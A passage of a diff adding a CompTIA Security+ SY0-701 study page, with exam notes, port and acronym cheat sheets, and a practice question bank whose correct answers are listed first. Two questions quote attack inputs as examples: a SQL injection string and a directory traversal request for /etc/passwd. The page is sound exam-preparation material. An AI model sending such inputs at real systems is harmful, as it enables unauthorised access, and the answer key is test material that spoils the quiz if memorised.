+<li>Monitor systems, applications, infrastructure. Activities: log aggregation, alerting, scanning, reporting, archiving, alert response (quarantine, alert tuning).</li>
+<li><b>Tools</b>: <b>SCAP</b> (standards for automated vuln/config checks), <b>benchmarks</b>, agents/agentless, <b>SIEM</b> (correlates logs from many sources, alerts), antivirus, <b>DLP</b>, <b>SNMP traps</b>, <b>NetFlow</b> (traffic metadata/flows), vulnerability scanners.</li>
+</ul>
+
+<h3>4.5 Modifying enterprise capabilities</h3>
+<ul>
+<li><b>Firewall</b>: rules, access lists, ports/protocols, screened subnets. Rules processed <b>top-down, first match wins</b>; end with <b>implicit deny</b>.</li>
+<li><b>IDS/IPS</b>: trends, <b>signatures</b> (known patterns) vs <b>anomaly/behavior-based</b> (deviation from baseline — catches zero-days, more false positives).</li>
+<li><b>Web filter</b>: agent-based, centralized proxy, URL scanning, content categorization, block rules, reputation.</li>
+<li><b>OS security</b>: Group Policy, <b>SELinux</b>.</li>
+<li><b>Secure protocols</b>: replace Telnet → SSH, HTTP → HTTPS, FTP → SFTP/FTPS, SNMPv1/2 → SNMPv3, LDAP → LDAPS.</li>
+<li><b>DNS filtering</b>; <b>email security</b>: <b>DMARC</b> (policy for failed checks + reporting), <b>DKIM</b> (digital signature in headers proves message not altered/from domain), <b>SPF</b> (DNS TXT list of servers allowed to send for domain), <b>gateway</b>.</li>
+<li><b>File integrity monitoring (FIM)</b>, <b>DLP</b>, <b>NAC</b>, <b>EDR/XDR</b>, <b>user behavior analytics (UBA)</b>.</li>
+</ul>
+
+<h3>4.6 Identity and access management</h3>
+<ul>
+<li><b>Provisioning/de-provisioning</b>, permission assignment, identity proofing, <b>federation</b> (trust between orgs), <b>SSO</b>.</li>
+<li>SSO protocols: <b>LDAP</b> (directory), <b>OAuth</b> (<i>authorization</i> — delegated access via tokens), <b>SAML</b> (XML assertions; IdP ↔ SP; web SSO), <b>OpenID Connect</b> (authentication layer on OAuth). <b>Kerberos</b> (tickets, AD, port 88).</li>
+<li><b>Interoperability</b>, <b>attestation</b>.</li>
+<li><b>Access control models</b>:
+<table>
+<tr><td><b>MAC</b> (Mandatory)</td><td>Labels/clearances set by admin (Top Secret). Military. Most strict.</td></tr>
+<tr><td><b>DAC</b> (Discretionary)</td><td>Owner decides who gets access (file share permissions).</td></tr>
+<tr><td><b>RBAC</b> (Role-based)</td><td>Access by job role/group.</td></tr>
+<tr><td><b>Rule-based</b></td><td>System rules (e.g., firewall ACL, time-of-day).</td></tr>
+<tr><td><b>ABAC</b> (Attribute-based)</td><td>Many attributes: user, location, device, time. Most granular.</td></tr>
+</table></li>
+<li><b>Time-of-day restrictions</b>, <b>least privilege</b>.</li>
+<li><b>MFA factors</b>: something you <b>know</b> (password, PIN), <b>have</b> (token, smart card, phone), <b>are</b> (biometrics), somewhere you <b>are</b> (location). Two passwords = still single-factor! Implementations: biometrics, hard/soft tokens (<b>TOTP</b> time-based, <b>HOTP</b> counter-based), security keys (FIDO2/passkeys).</li>
+<li>Biometrics: <b>FAR</b> (false acceptance — security risk), <b>FRR</b> (false rejection — usability), <b>CER</b> (crossover — lower is better).</li>
+<li><b>Password concepts</b>: length, complexity, reuse, expiration, age; password managers, <b>passwordless</b>.</li>
+<li><b>Privileged access management (PAM)</b>: <b>just-in-time permissions</b>, <b>password vaulting</b>, <b>ephemeral credentials</b>.</li>
+</ul>
+
+<h3>4.7 Automation and orchestration</h3>
+<p>Use cases: user/resource provisioning, guard rails, security groups, ticket creation, escalation, enabling/disabling services, CI/CD testing, API integrations. <b>SOAR</b> automates response via playbooks. Benefits: efficiency, enforcing baselines, standard configs, scaling, employee retention, reaction time, workforce multiplier. Considerations: complexity, cost, <b>single point of failure</b>, technical debt, ongoing supportability.</p>
+
+<h3>4.8 Incident response</h3>
+<div class="callout"><b>Process (CompTIA order):</b> <b>Preparation → Detection → Analysis → Containment → Eradication → Recovery → Lessons Learned</b></div>
+<ul>
+<li><b>Training</b> and <b>testing</b>: tabletop exercise, simulation.</li>
+<li><b>Root cause analysis</b>, <b>threat hunting</b> (proactively searching for undetected threats).</li>
+<li><b>Digital forensics</b>: <b>legal hold</b> (preserve data for litigation), <b>chain of custody</b> (document who handled evidence when), acquisition, reporting, preservation, <b>e-discovery</b>.</li>
+<li><b>Order of volatility</b> (collect most volatile first): CPU registers/cache → RAM → swap/page file, temp files → disk → remote logs → archival/backup media.</li>
+<li>Take hashes of evidence/images to prove integrity; work from a copy (bit-by-bit image).</li>
+</ul>
+
+<h3>4.9 Data sources for investigations</h3>
+<p>Log data: firewall, application, endpoint, OS-specific security logs, IPS/IDS, network, metadata. Other sources: vulnerability scans, automated reports, dashboards, <b>packet captures</b> (full content — most detail).</p>
+</section>
+
+<section class="domain" id="d5">
+<h2><span class="dn">5.0</span> Security Program Management &amp; Oversight <span class="wt">20%</span></h2>
+
+<h3>5.1 Security governance</h3>
+<ul>
+<li><b>Guidelines</b> (recommended), <b>policies</b> (high-level mandatory: AUP, information security, BC, DR, incident response, SDLC, change management), <b>standards</b> (specific mandatory: password, access control, physical, encryption), <b>procedures</b> (step-by-step: change management, onboarding/offboarding, playbooks).</li>
+<li>External considerations: regulatory, legal, industry, local/regional, national, global.</li>
+<li>Monitoring and revision. Types of governance structures: boards, committees, government entities, centralized/decentralized.</li>
+<li><b>Roles</b>: <b>Owner</b> (accountable, senior person; sets classification), <b>Controller</b> (decides why/how personal data is processed), <b>Processor</b> (processes on controller's behalf), <b>Custodian/steward</b> (day-to-day handling, backups, implements controls).</li>
+</ul>
+
+<h3>5.2 Risk management</h3>
+<ul>
+<li><b>Identification → assessment → analysis → register → tolerance/appetite → strategies → reporting</b>.</li>
+<li>Assessment types: ad hoc, recurring, one-time, continuous.</li>
+<li><b>Qualitative</b> (high/medium/low, heat map) vs <b>quantitative</b> (dollars).</li>
+</ul>
+<div class="callout">
+<b>Quantitative formulas</b><br>
+<b>SLE</b> (Single Loss Expectancy) = <b>AV</b> (Asset Value) × <b>EF</b> (Exposure Factor %)<br>
+<b>ALE</b> (Annualized Loss Expectancy) = <b>SLE × ARO</b> (Annualized Rate of Occurrence)<br>
+Example: $200,000 server, 25% damaged per flood → SLE = $50,000. Flood every 4 years → ARO = 0.25 → ALE = $12,500.<br>
+If a control costs more per year than the ALE it reduces, it isn't cost-justified.
+</div>
+<ul>
+<li><b>Risk register</b>: key risk indicators, risk owners, risk threshold.</li>
+<li><b>Risk appetite</b>: expansionary, conservative, neutral. <b>Risk tolerance</b>.</li>
+<li><b>Strategies</b>: <b>Transfer</b> (insurance, outsourcing), <b>Accept</b> (with exemption/exception), <b>Avoid</b> (stop the activity), <b>Mitigate</b> (apply controls).</li>
+<li><b>Business impact analysis (BIA)</b>:
+  <ul>
+  <li><b>RTO</b> — Recovery Time Objective: max time to restore.</li>
+  <li><b>RPO</b> — Recovery Point Objective: max acceptable <i>data loss</i> (time since last good backup).</li>
+  <li><b>MTTR</b> — Mean Time To Repair. <b>MTBF</b> — Mean Time Between Failures (reliability).</li>
+  </ul></li>
+</ul>
+
+<h3>5.3 Third-party risk</h3>
+<ul>
+<li>Vendor assessment: <b>penetration testing</b>, <b>right-to-audit clause</b>, evidence of internal audits, independent assessments, supply chain analysis.</li>
+<li>Vendor selection: due diligence, conflict of interest. Vendor monitoring, questionnaires, rules of engagement.</li>
+<li><b>Agreement types</b>:
+<table>
+<tr><td><b>SLA</b></td><td>Service Level Agreement — performance/uptime metrics</td></tr>
+<tr><td><b>MOA / MOU</b></td><td>Memorandum of agreement/understanding — intent to work together (MOU usually not legally binding)</td></tr>
+<tr><td><b>MSA</b></td><td>Master Service Agreement — overall terms for future work</td></tr>
+<tr><td><b>SOW / WO</b></td><td>Statement of Work / Work Order — specific deliverables under an MSA</td></tr>
+<tr><td><b>NDA</b></td><td>Non-disclosure — confidentiality</td></tr>
+<tr><td><b>BPA</b></td><td>Business Partners Agreement — partnership terms, profit sharing</td></tr>
+</table></li>
+</ul>
+
+<h3>5.4 Compliance</h3>
+<ul>
+<li>Compliance reporting (internal/external). Consequences of non-compliance: fines, sanctions, reputational damage, loss of license, contractual impacts.</li>
+<li>Compliance monitoring: due diligence/care, attestation and acknowledgement, internal/external, automation.</li>
+<li><b>Privacy</b>: legal implications (local/regional, national, global), <b>data subject</b>, controller vs processor, ownership, data inventory and retention, <b>right to be forgotten</b> (GDPR).</li>
+<li>Know names: <b>GDPR</b> (EU privacy), <b>HIPAA</b> (US health data), <b>PCI DSS</b> (payment cards — industry standard, not a law), <b>SOX</b> (financial reporting), <b>GLBA</b> (financial institutions), <b>FERPA</b> (student records).</li>
+</ul>
+
+<h3>5.5 Audits and assessments</h3>
+<ul>
+<li>Attestation; internal (compliance, audit committee, self-assessments); external (regulatory, examinations, assessment, independent third-party audit).</li>
+<li><b>Penetration testing</b>: physical, offensive (red), defensive (blue), integrated (purple). Environments: <b>known</b> (white box — full info), <b>partially known</b> (gray box), <b>unknown</b> (black box — no info).</li>
+<li><b>Reconnaissance</b>: passive (OSINT, no direct contact) vs active (scanning the target).</li>
+<li><b>Rules of engagement</b> define scope, timing, allowed techniques.</li>
+</ul>
+
+<h3>5.6 Security awareness</h3>
+<ul>
+<li><b>Phishing campaigns</b>: recognize attempts, respond to reported suspicious messages.</li>
+<li><b>Anomalous behavior recognition</b>: risky, unexpected, unintentional.</li>
+<li><b>User guidance and training</b>: policy/handbooks, situational awareness, insider threat, password management, removable media and cables, social engineering, operational security, hybrid/remote work environments.</li>
+<li><b>Reporting and monitoring</b>: initial and recurring. Development and execution.</li>
+</ul>
+</section>
+</div>
+</section>
+
+<section id="v-practice" hidden>
+ <div id="quizSetup" class="setup">
+  <h2>Practice exam</h2>
+  <p class="sub"><span id="totalQ"></span> questions in the bank. Answer choices are shuffled every attempt.</p>
+  <div class="callout"><b>Full timed exam</b> — 90 questions weighted like the real SY0-701 (12/22/18/28/20%), 90-minute timer, answers revealed at the end.<br><br><button class="btn big" data-m="exam">Start full exam</button></div>
+  <h3>Study quizzes</h3>
+  <label class="row"><input type="checkbox" id="instant" checked> Show answer &amp; explanation after each question</label>
+  <div id="domBtns"></div>
+  <div class="row"><button class="btn ghost" data-m="all">All questions (shuffled)</button><button class="btn ghost" data-m="missed">Missed questions (<span id="missedCount">0</span>)</button></div>
+  <div id="history"></div>
+  <p class="muted" style="margin-top:20px">Progress is saved in this browser only. <button class="btn ghost" id="resetAll" style="padding:4px 10px;font-size:13px">Clear progress</button></p>
+ </div>
+ <div id="quizArea"></div>
+</section>
+
+<section id="v-pbq" hidden>
+ <h2>Performance-based questions</h2>
+ <p class="sub">The real exam typically opens with a few PBQs (drag-and-drop, configuration, log analysis). These simulate those formats. Partial credit is shown per item.</p>
+ <div id="pbqList"></div>
+ <div id="pbqArea"></div>
+</section>
+
+<section id="v-cheat" hidden><h2>Ports you must know</h2>
+<table class="ports">
+<tr><th>Port</th><th>Protocol</th><th>Secure alternative / note</th></tr>
+<tr><td>20/21</td><td>FTP</td><td>SFTP (22) / FTPS (989/990)</td></tr>
+<tr><td>22</td><td>SSH, SFTP, SCP</td><td>Secure</td></tr>
+<tr><td>23</td><td>Telnet</td><td>Replace with SSH (22)</td></tr>
+<tr><td>25</td><td>SMTP</td><td>SMTPS 465 / submission 587 (STARTTLS)</td></tr>
+<tr><td>53</td><td>DNS (UDP/TCP)</td><td>DNSSEC adds integrity; DoH 443</td></tr>
+<tr><td>67/68</td><td>DHCP</td><td>DHCP snooping</td></tr>
+<tr><td>69</td><td>TFTP</td><td>No authentication</td></tr>
+<tr><td>80</td><td>HTTP</td><td>HTTPS (443)</td></tr>
+<tr><td>88</td><td>Kerberos</td><td>Secure</td></tr>
+<tr><td>110</td><td>POP3</td><td>POP3S (995)</td></tr>
+<tr><td>123</td><td>NTP</td><td>Time sync matters for logs &amp; Kerberos</td></tr>
+<tr><td>143</td><td>IMAP</td><td>IMAPS (993)</td></tr>
+<tr><td>161/162</td><td>SNMP / traps</td><td>Use SNMPv3</td></tr>
+<tr><td>389</td><td>LDAP</td><td>LDAPS (636)</td></tr>
+<tr><td>443</td><td>HTTPS / TLS</td><td>Secure</td></tr>
+<tr><td>445</td><td>SMB</td><td>Block at perimeter</td></tr>
+<tr><td>514</td><td>Syslog</td><td>Syslog over TLS 6514</td></tr>
+<tr><td>1812/1813</td><td>RADIUS</td><td>Auth/accounting</td></tr>
+<tr><td>3389</td><td>RDP</td><td>Put behind VPN/jump server</td></tr>
+<tr><td>5060/5061</td><td>SIP / SIP-TLS</td><td>VoIP</td></tr>
+<tr><td>49</td><td>TACACS+</td><td>Encrypts whole payload (RADIUS only the password)</td></tr>
+</table>
+
+<h2>Commonly confused pairs</h2>
+<table>
+<tr><th>This</th><th>vs.</th><th>That</th></tr>
+<tr><td>IDS — detects, alerts, passive</td><td>│</td><td>IPS — inline, blocks</td></tr>
+<tr><td>RPO — how much data you can lose</td><td>│</td><td>RTO — how long you can be down</td></tr>
+<tr><td>Incremental — since last <i>any</i> backup</td><td>│</td><td>Differential — since last <i>full</i></td></tr>
+<tr><td>Hashing — integrity, one-way</td><td>│</td><td>Encryption — confidentiality, reversible</td></tr>
+<tr><td>Sign with sender's <b>private</b> key</td><td>│</td><td>Encrypt with recipient's <b>public</b> key</td></tr>
+<tr><td>CRL — downloaded list</td><td>│</td><td>OCSP — real-time query</td></tr>
+<tr><td>TPM — chip in one device</td><td>│</td><td>HSM — dedicated key appliance</td></tr>
+<tr><td>Virus — needs user/host</td><td>│</td><td>Worm — self-spreads</td></tr>
+<tr><td>Evil twin — impersonates your SSID</td><td>│</td><td>Rogue AP — unauthorized AP on your LAN</td></tr>
+<tr><td>Password spraying — 1 password, many users</td><td>│</td><td>Brute force — many passwords, 1 user</td></tr>
+<tr><td>CSRF — victim's browser sends request</td><td>│</td><td>SSRF — server makes request</td></tr>
+<tr><td>OAuth — authorization</td><td>│</td><td>SAML/OIDC — authentication/SSO</td></tr>
+<tr><td>FAR — impostor let in</td><td>│</td><td>FRR — legit user rejected</td></tr>
+<tr><td>Fail-open — availability</td><td>│</td><td>Fail-closed — security</td></tr>
+<tr><td>Hot site — ready now</td><td>│</td><td>Cold site — empty room</td></tr>
+<tr><td>Data owner — accountable</td><td>│</td><td>Custodian — does the work</td></tr>
+<tr><td>SPF — allowed senders</td><td>│</td><td>DKIM — signature · DMARC — policy</td></tr>
+<tr><td>Known env (white box)</td><td>│</td><td>Unknown env (black box)</td></tr>
+<tr><td>Tokenization — swap for token</td><td>│</td><td>Masking — hide part (****1234)</td></tr>
+</table>
+
+<h2>Formulas &amp; orders</h2>
+<div class="callout">
+SLE = AV × EF &nbsp;·&nbsp; ALE = SLE × ARO<br>
+IR: Preparation → Detection → Analysis → Containment → Eradication → Recovery → Lessons Learned<br>
+Volatility: Registers/cache → RAM → swap/temp → disk → remote logs → backups<br>
+Risk responses: Transfer · Accept · Avoid · Mitigate
+</div>
+
+<h2>High-yield acronyms</h2>
+<div class="acr">
+<span><b>AAA</b> Authentication, Authorization, Accounting</span>
+<span><b>ACL</b> Access Control List</span>
+<span><b>APT</b> Advanced Persistent Threat</span>
+<span><b>BIA</b> Business Impact Analysis</span>
+<span><b>BPA</b> Business Partners Agreement</span>
+<span><b>CASB</b> Cloud Access Security Broker</span>
+<span><b>CVE</b> Common Vulnerabilities and Exposures</span>
+<span><b>CVSS</b> Common Vulnerability Scoring System</span>
+<span><b>DLP</b> Data Loss Prevention</span>
+<span><b>EDR</b> Endpoint Detection and Response</span>
+<span><b>FIM</b> File Integrity Monitoring</span>
+<span><b>HSM</b> Hardware Security Module</span>
+<span><b>IoC</b> Indicator of Compromise</span>
+<span><b>ISAC</b> Information Sharing and Analysis Center</span>
+<span><b>MDM</b> Mobile Device Management</span>
+<span><b>MOU</b> Memorandum of Understanding</span>
+<span><b>MSA</b> Master Service Agreement</span>
+<span><b>MTBF</b> Mean Time Between Failures</span>
+<span><b>MTTR</b> Mean Time To Repair</span>
+<span><b>NAC</b> Network Access Control</span>
+<span><b>OSINT</b> Open-Source Intelligence</span>
+<span><b>PAM</b> Privileged Access Management</span>
+<span><b>PEP</b> Policy Enforcement Point</span>
+<span><b>PFS</b> Perfect Forward Secrecy</span>
+<span><b>RTO / RPO</b> Recovery Time / Point Objective</span>
+<span><b>SASE</b> Secure Access Service Edge</span>
+<span><b>SCAP</b> Security Content Automation Protocol</span>
+<span><b>SD-WAN</b> Software-Defined WAN</span>
+<span><b>SIEM</b> Security Information and Event Management</span>
+<span><b>SLA</b> Service Level Agreement</span>
+<span><b>SOAR</b> Security Orchestration, Automation and Response</span>
+<span><b>SOW</b> Statement of Work</span>
+<span><b>TOTP / HOTP</b> Time / HMAC-based One-Time Password</span>
+<span><b>TPM</b> Trusted Platform Module</span>
+<span><b>UTM</b> Unified Threat Management</span>
+<span><b>WAF</b> Web Application Firewall</span>
+<span><b>XDR</b> Extended Detection and Response</span>
+</div>
+</section>
+<footer><p>Based on the CompTIA Security+ SY0-701 exam objectives. Practice questions are original and not from the real exam.</p></footer>
+</main>
+<script>
+// Format: [domain, question, [CORRECT, wrong, wrong, wrong], explanation]  (options are shuffled at runtime)
+const QB = [
+// ---------- Domain 1 (12) ----------
+[1,"A company posts signs warning that the premises are under 24-hour video surveillance. Which control type BEST describes the signs?",["Deterrent","Detective","Corrective","Compensating"],"Signs discourage an attacker from trying. The cameras themselves would be detective; the sign is deterrent."],
+[1,"A legacy system cannot be patched, so the security team places it on an isolated VLAN with strict ACLs. What type of control is this?",["Compensating","Preventive","Directive","Deterrent"],"A compensating control is an alternative used when the primary control (patching) isn't feasible."],
+[1,"Which of the following provides non-repudiation for an email message?",["Digital signature using the sender's private key","Encrypting with the recipient's public key","Hashing the message with SHA-256","Sending over TLS"],"Only the sender holds the private key, so a signature proves origin and they can't deny sending it."],
+[1,"In a Zero Trust architecture, which component makes the decision to grant or deny access to a resource?",["Policy Engine","Policy Enforcement Point","Implicit trust zone","Subject"],"The Policy Engine decides; the Policy Administrator communicates it; the PEP enforces it in the data plane."],
+[1,"Before a major firewall upgrade, the change advisory board asks what will happen if the change causes an outage. Which document addresses this?",["Backout plan","Impact analysis","Maintenance window","Standard operating procedure"],"A backout plan describes how to roll back to the previous state if the change fails."],
+[1,"An administrator wants to store user passwords so that identical passwords produce different stored values. What should be added?",["Salt","Key escrow","Steganography","Pepper stored in the same table"],"A unique random salt per password produces different hashes for identical passwords and defeats rainbow tables."],
+[1,"Which hardware component is BEST suited to securely generate and store keys for an organization's certificate authority?",["HSM","TPM","Secure enclave on a laptop","Smart card"],"An HSM is a dedicated, tamper-resistant appliance for managing many keys at enterprise scale."],
+[1,"A web server wants to reduce load on the CA by including a time-stamped, signed certificate status in its TLS handshake. What is this?",["OCSP stapling","CRL distribution","Certificate pinning","Key escrow"],"With OCSP stapling, the server fetches and 'staples' the OCSP response so clients don't query the CA directly."],
+[1,"A single certificate needs to secure www.example.com, mail.example.com and shop.example.com. Which is the simplest option?",["Wildcard certificate for *.example.com","Self-signed certificate","Three separate root certificates","Code-signing certificate"],"A wildcard covers all first-level subdomains. A SAN cert would also work, but wildcard is the classic answer for same-domain subdomains."],
+[1,"A security analyst places a fake file named 'passwords.xlsx' on a file share and configures alerts when it is opened. What is this?",["Honeyfile","Honeynet","Honeypot","DNS sinkhole"],"A honeyfile is bait data that alerts when accessed."],
+[1,"Which security concept is MOST directly supported by hashing a downloaded file and comparing it to the vendor's published value?",["Integrity","Confidentiality","Availability","Non-repudiation"],"A matching hash shows the file wasn't altered."],
+[1,"An access control vestibule is primarily designed to prevent which of the following?",["Tailgating","Shoulder surfing","Dumpster diving","Phishing"],"An access control vestibule (mantrap) allows one person through at a time, stopping tailgating/piggybacking."],
+[1,"Which algorithm provides strong security with smaller key sizes, making it suitable for mobile and IoT devices?",["ECC","RSA","3DES","MD5"],"Elliptic Curve Cryptography achieves equivalent strength to RSA with much smaller keys."],
+[1,"An application replaces credit card numbers with random values and stores the mapping in a secure vault. What technique is this?",["Tokenization","Data masking","Hashing","Steganography"],"Tokenization substitutes data with a token; the original is retrievable only via the token vault."],
+
+// ---------- Domain 2 (22) ----------
+[2,"An attacker with significant funding conducts a stealthy, long-term campaign to steal defense research. Which threat actor is MOST likely?",["Nation-state","Unskilled attacker","Hacktivist","Shadow IT"],"Long-term stealthy espionage with high resources is the signature of a nation-state APT."],
+[2,"A group defaces a company's website to protest its environmental policies. Which threat actor is this?",["Hacktivist","Organized crime","Insider threat","Nation-state"],"Hacktivists are motivated by philosophical or political beliefs."],
+[2,"Employees in marketing set up an unapproved cloud file-sharing service to collaborate with a vendor. This is an example of:",["Shadow IT","Insider threat","Supply chain attack","Watering hole"],"Shadow IT is use of IT resources without the knowledge/approval of the IT department."],
+[2,"The CFO receives an email that appears to be from the CEO, asking for an urgent wire transfer to a new vendor. What attack is this?",["Business email compromise / whaling","Smishing","Watering hole","Typosquatting"],"Targeting executives (whaling) with impersonation of a senior leader requesting payment is BEC."],
+[2,"Attackers compromise a popular industry forum that employees of a target company frequently visit. What is this attack?",["Watering hole","Spear phishing","Pretexting","Brand impersonation"],"Watering hole attacks infect a site that the target group is known to visit."],
+[2,"A user receives a text message claiming their bank account is locked, with a link to reset it. What is this?",["Smishing","Vishing","Whaling","Pharming"],"SMS-based phishing is smishing."],
+[2,"A caller claims to be from the help desk and needs the user's password to fix a mailbox issue. Which technique is primarily being used?",["Pretexting","Typosquatting","Watering hole","Tailgating"],"Pretexting creates an invented scenario to get the victim to give up information. Over the phone it's also vishing."],
+[2,"Which attack inputs ' OR 1=1 -- into a login form?",["SQL injection","Cross-site scripting","Directory traversal","Buffer overflow"],"This classic payload makes the SQL WHERE clause always true and comments out the rest."],
+[2,"A web log shows a request for /download?file=../../../../etc/passwd. What attack is being attempted?",["Directory traversal","SQL injection","CSRF","Replay"],"../ sequences attempt to escape the web root and read arbitrary files."],
+[2,"A forum lets users post comments. An attacker posts a comment containing <script> that steals the session cookies of anyone who views it. What is this?",["Stored cross-site scripting","Reflected XSS","SQL injection","Server-side request forgery"],"Script saved on the server and served to other users is stored (persistent) XSS."],
+[2,"A program checks a file's permissions, then an attacker swaps the file before the program uses it. What vulnerability is this?",["Race condition (TOC/TOU)","Buffer overflow","Memory leak","Integer overflow"],"Time-of-check to time-of-use is a race condition exploiting the gap between check and use."],
+[2,"Malware spreads across the network to other systems by exploiting a vulnerability, without user interaction. What type is it?",["Worm","Virus","Trojan","Logic bomb"],"Worms self-replicate across networks; viruses require a host file and user action."],
+[2,"A terminated administrator left code that deletes the payroll database on the 1st of next month. What is this?",["Logic bomb","Rootkit","Spyware","RAT"],"A logic bomb executes when a specific condition or date is met."],
+[2,"An EDR alert shows PowerShell running encoded commands in memory, but no malicious file on disk. Which malware type is MOST likely?",["Fileless malware","Bloatware","Ransomware","Keylogger"],"Fileless malware lives in memory and abuses legitimate tools like PowerShell."],
+[2,"The SIEM shows many accounts each experiencing one failed login with the password 'Winter2026!' within a few minutes. What attack is this?",["Password spraying","Brute force","Rainbow table","Credential stuffing of one account"],"Trying one common password against many accounts avoids lockout thresholds — password spraying."],
+[2,"A user logs in from New York and, 10 minutes later, from Singapore. Which indicator is this?",["Impossible travel","Concurrent session usage only","Resource consumption","Out-of-cycle logging"],"Logins from locations that can't physically be reached in the time between them indicate impossible travel."],
+[2,"An attacker sets up an access point broadcasting the same SSID as the corporate network to capture credentials. What is this?",["Evil twin","Rogue access point","Bluejacking","Jamming"],"An evil twin impersonates a legitimate SSID. A rogue AP is an unauthorized AP connected to the internal network."],
+[2,"An attacker sends spoofed ARP replies so that traffic for the gateway goes to the attacker's machine. What attack results?",["On-path attack","DNS poisoning","DDoS amplification","VM escape"],"ARP poisoning redirects traffic through the attacker, enabling an on-path (MitM) attack."],
+[2,"Small DNS queries with a spoofed source address result in large responses flooding the victim. What is this?",["Amplified reflected DDoS","SYN flood","Replay attack","Domain hijacking"],"The attacker reflects traffic off DNS servers and amplifies it via large responses."],
+[2,"An attacker forces a client and server to negotiate an older, weaker version of TLS. What is this?",["Downgrade attack","Collision attack","Birthday attack","Replay attack"],"Downgrade attacks force use of weaker protocols or ciphers."],
+[2,"An attacker in a VM exploits a hypervisor flaw to access other VMs on the same host. What is this?",["VM escape","VM sprawl","Resource reuse","Sideloading"],"VM escape breaks out of a guest into the hypervisor/host."],
+[2,"A user installs apps from outside the official app store on a company phone. This is known as:",["Sideloading","Jailbreaking","Bluesnarfing","Tethering"],"Sideloading installs apps from unofficial sources. Jailbreaking removes OS restrictions."],
+[2,"Which mitigation BEST prevents unauthorized executables from running on kiosks?",["Application allow list","Antivirus with signatures","Host-based firewall","Full-disk encryption"],"An allow list permits only approved applications; everything else is blocked."],
+[2,"A recently disclosed vulnerability has no vendor patch available yet. What is it called?",["Zero-day","Legacy vulnerability","False positive","Misconfiguration"],"A zero-day is unknown to the vendor or has no patch."],
+[2,"An attacker captures an authentication token and resends it later to gain access. What attack is this?",["Replay","Pass-the-hash","Privilege escalation","Downgrade"],"Replay attacks resend captured valid data. Timestamps/nonces and session expiration mitigate it."],
+
+// ---------- Domain 3 (18) ----------
+[3,"In an IaaS model, which is the customer responsible for securing?",["Operating system, applications and data","Physical data center","Hypervisor","Physical network hardware"],"Under shared responsibility in IaaS, the provider secures physical and virtualization layers; the customer secures from the OS up."],
+[3,"Which architecture separates the control plane from the data plane to centrally manage network devices?",["Software-defined networking","Air-gapped network","Microservices","Serverless"],"SDN decouples control (decisions) from data forwarding."],
+[3,"A plant's SCADA network must not connect to any other network. Which approach meets this?",["Air gap","VLAN segmentation","Screened subnet","VPN"],"An air gap provides physical isolation with no network connection."],
+[3,"Where should a company place its public-facing web server?",["Screened subnet (DMZ)","Internal LAN","Management VLAN","Behind the database tier"],"A DMZ isolates public services from the internal network."],
+[3,"A firewall protecting a hospital's life-safety system must keep passing traffic if it fails. What failure mode is this?",["Fail-open","Fail-closed","Fail-secure","Fail-over"],"Fail-open prioritizes availability; traffic continues if the device fails."],
+[3,"Which device should be deployed to protect a web application specifically from SQL injection and XSS?",["WAF","Layer 4 firewall","Forward proxy","Load balancer"],"A Web Application Firewall inspects HTTP traffic for application attacks."],
+[3,"Administrators must connect to servers in a secure zone through a single hardened host that is heavily monitored. What is this host?",["Jump server","Reverse proxy","Honeypot","Load balancer"],"A jump server (bastion host) is the controlled entry point for administrative access."],
+[3,"Which standard provides port-based network access control using a supplicant, authenticator and authentication server?",["802.1X","802.11ac","WPA2-PSK","SNMPv3"],"802.1X uses EAP with a RADIUS server to authenticate devices before granting port access."],
+[3,"Which IPsec component provides encryption of the payload?",["ESP","AH","IKE phase 1 only","GRE"],"Encapsulating Security Payload provides confidentiality. AH provides integrity/authentication only."],
+[3,"A company wants cloud-delivered networking and security (SWG, CASB, ZTNA) for remote users. Which solution fits?",["SASE","SD-WAN alone","NAT","Jump server"],"Secure Access Service Edge combines network and security services delivered from the cloud."],
+[3,"Customer data stored in Germany must remain subject to German law. Which concept is this?",["Data sovereignty","Data masking","Data classification","Tokenization"],"Data sovereignty means data is subject to the laws of the country where it resides."],
+[3,"Data being processed in RAM is in which state?",["In use","At rest","In transit","Archived"],"Data in use is actively processed in memory/CPU."],
+[3,"Which recovery site has power and space but no equipment, making it the cheapest and slowest option?",["Cold site","Warm site","Hot site","Mobile site"],"Cold sites provide only basic facilities."],
+[3,"A full backup runs Sunday, and backups since the last full run Mon–Fri. Restoring Friday requires Sunday's full and only Friday's backup. What backup type ran Mon–Fri?",["Differential","Incremental","Snapshot","Copy"],"Differential backups include all changes since the last full, so only the latest one is needed."],
+[3,"Which provides short-term power to systems during an outage until a generator starts?",["UPS","PDU","Generator","Dual power supply"],"An uninterruptible power supply bridges the gap; generators provide long-term power."],
+[3,"Team members walk through a ransomware scenario in a conference room without touching systems. What is this?",["Tabletop exercise","Failover test","Parallel processing","Penetration test"],"A tabletop is a discussion-based exercise."],
+[3,"Which is a key security benefit of Infrastructure as Code?",["Consistent, repeatable configurations","Eliminates need for patching","Removes shared responsibility","Encrypts data at rest automatically"],"IaC templates reduce configuration drift and human error."],
+[3,"IoT cameras with hard-coded credentials must stay in use. What is the BEST mitigation?",["Place them on an isolated network segment","Install antivirus on them","Disable logging","Give them public IP addresses"],"Segmentation limits what a compromised IoT device can reach."],
+[3,"Which device distributes incoming traffic across multiple servers to improve availability?",["Load balancer","Proxy server","IDS","Jump server"],"Load balancers spread requests and remove failed servers from rotation."],
+
+// ---------- Domain 4 (28) ----------
+[4,"Which wireless security protocol replaces the PSK handshake with SAE to resist offline dictionary attacks?",["WPA3","WPA2","WEP","WPS"],"WPA3-Personal uses Simultaneous Authentication of Equals."],
+[4,"Employees buy their own phones, and the company installs a container to manage work data. Which deployment model is this?",["BYOD","COPE","CYOD","Kiosk"],"Bring Your Own Device: the user owns the device."],
+[4,"The company owns phones but lets employees use them for personal purposes. Which model is this?",["COPE","BYOD","CYOD","VDI"],"Corporate-Owned, Personally Enabled."],
+[4,"Before disposing of hard drives, the company needs proof that data was destroyed. What should it obtain?",["Certificate of destruction","Chain of custody","Legal hold","Data retention policy"],"Certification documents that sanitization/destruction occurred."],
+[4,"A vulnerability scan reports a flaw, but manual review shows the patch is already installed. What is this?",["False positive","False negative","True positive","Exception"],"A false positive is an alert on an issue that doesn't exist."],
+[4,"Which scan type will provide the MOST accurate results about missing patches on servers?",["Credentialed scan","Non-credentialed scan","Port scan","Passive scan"],"Credentialed scans log in and can see installed software and patch levels."],
+[4,"What is used to rate the severity of a vulnerability on a 0–10 scale?",["CVSS","CVE","SCAP","STIX"],"CVSS scores severity. CVE is the identifier."],
